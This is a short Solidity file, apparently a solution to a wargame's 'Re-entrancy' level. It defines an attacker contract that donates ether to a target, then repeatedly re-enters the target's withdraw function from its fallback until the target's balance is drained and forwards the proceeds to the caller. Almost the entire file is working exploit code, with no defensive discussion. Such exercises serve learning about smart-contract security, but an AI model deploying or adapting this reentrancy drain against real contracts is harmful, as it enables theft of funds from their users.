pragma solidity ^0.4.18;

// import "./10Re-entrancy.sol";

contract Reentrance {
    function donate(address _to) public payable;

    function balanceOf(address _who) public view returns (uint balance);

    function withdraw(uint _amount) public;
    function() public payable;
}

contract Recursion {

    Reentrance public reentrance;

    function Recursion (address reentrance_address) public {
        reentrance = Reentrance(reentrance_address);
    }

    function collect () public payable {
        // initiate the balance with some value
        reentrance.donate.value(msg.value)(address(this));
        // start the recursion
        reentrance.withdraw(msg.value);
    }

    // To withdraw funds finally
    function withdraw () public {
        msg.sender.transfer(this.balance);
    }
  
    function () public payable {
        // stop the recursion if there is no longer enough eth in the contract
        if (address(reentrance).balance >= msg.value) {
            // recursively call withdraw that will call this back
            reentrance.withdraw(msg.value);
        }
    }

}